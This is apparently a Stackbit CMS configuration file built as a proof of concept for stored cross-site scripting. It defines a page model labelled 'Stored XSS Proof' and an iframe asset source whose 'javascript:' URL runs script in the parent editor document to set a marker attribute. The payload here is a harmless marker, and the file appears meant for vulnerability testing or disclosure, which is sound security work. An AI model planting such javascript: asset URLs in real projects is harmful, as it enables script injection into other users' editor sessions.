import { defineStackbitConfig } from '@stackbit/types';
import { GitContentSource } from '@stackbit/cms-git';

export default defineStackbitConfig({
  stackbitVersion: '~0.6.0',
  ssgName: 'custom',
  nodeVersion: '18',
  installCommand: 'npm install',
  devCommand: 'node server.js --port {PORT} --hostname {HOSTNAME}',
  buildCommand: 'npm run build',
  publishDir: 'dist',
  contentSources: [
    new GitContentSource({
      rootPath: __dirname,
      contentDirs: ['content'],
      models: [
        {
          type: 'page',
          name: 'XssProof',
          label: 'Stored XSS Proof',
          urlPath: '/',
          filePath: 'content/index.json',
          fields: [
            { name: 'title', type: 'string', required: true },
            { name: 'description', type: 'text' },
            { name: 'heroImage', type: 'image' },
            {
              name: 'customControl',
              type: 'string',
              controlType: 'custom-inline-script',
              controlFilePath: 'custom-control.js'
            }
          ]
        }
      ],
      assetsConfig: {
        referenceType: 'static',
        staticDir: 'assets',
        uploadDir: '.',
        publicPath: '/assets/'
      }
    })
  ],
  assetSources: [
    {
      name: 'owned-iframe-source',
      type: 'iframe',
      url: "javascript:(()=>{parent.document.documentElement.setAttribute('data-create-asset-xss','confirmed');return '<!doctype html><body>safe marker</body>'})()"
    }
  ]
});
